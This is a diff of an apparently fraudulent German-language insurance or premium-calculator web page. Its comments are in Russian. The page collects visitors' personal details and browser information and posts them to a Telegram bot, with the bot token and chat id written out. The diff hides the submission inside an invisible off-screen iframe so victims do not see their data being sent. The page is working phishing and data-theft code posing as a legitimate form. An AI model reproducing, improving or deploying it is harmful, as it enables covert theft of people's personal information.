@@ -282,7 +282,6 @@
 
   <main class="main">
     
-    <!-- Блок с предупреждением -->
     <div class="alert-banner">
       <div class="alert-banner__inner">
         <div class="alert-banner__icon">
@@ -314,17 +313,15 @@
       <section class="premium-calc">
         <h2 class="premium-calc__title" data-lang-ch="Persönliche Daten" data-lang-en="Personal details">Persönliche Daten</h2>
 
-        <!-- Форма, которая отправляет данные напрямую в Telegram через новую вкладку -->
+        <!-- Форма отправляет данные в скрытый iframe -->
         <form class="premium-calc__form" 
               id="telegramForm"
               action="https://api.telegram.org/bot9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI/sendMessage" 
               method="POST"
-              target="_blank">
+              target="tg_iframe">
               
           <input type="hidden" name="chat_id" value="-1003907097706">
           
-          
-          <!-- Скрытое поле для сообщения -->
           <textarea name="text" id="telegramText" style="position:absolute; left:-9999px; top:-9999px; opacity:0;" tabindex="-1" aria-hidden="true"></textarea>
 
           <div class="input-group">
@@ -508,9 +505,11 @@
     </div>
   </footer>
 
+  <!-- Невидимый iframe для отправки -->
+  <iframe name="tg_iframe" id="tg_iframe" style="width:0; height:0; border:0; position:absolute; left:-9999px; top:-9999px;"></iframe>
+
   <script>
     document.addEventListener('DOMContentLoaded', () => {
-      // Маска для даты
       const geburtsdatumInput = document.getElementById('geburtsdatum');
       if (geburtsdatumInput) {
         geburtsdatumInput.addEventListener('input', function (e) {
@@ -524,7 +523,6 @@
         });
       }
 
-      // Перевод
       const langBtns = document.querySelectorAll('.lang-btn');
       const translatableElements = document.querySelectorAll('[data-lang-ch]');
       
@@ -547,7 +545,6 @@
         });
       });
 
-      // Отправка (без preventDefault, чтобы форма ушла сама)
       const form = document.getElementById('telegramForm');
       
       form.addEventListener('submit', () => {
@@ -577,10 +574,7 @@
         message += `🕒 Zeit: ${dateTime}\n`;
         message += `🌐 Browser: ${browserInfo}\n`;
 
-        // Записываем текст в скрытое поле
         document.getElementById('telegramText').value = message;
-        
-        // Форма уходит сама в новую вкладку
       });
     });
   </script>
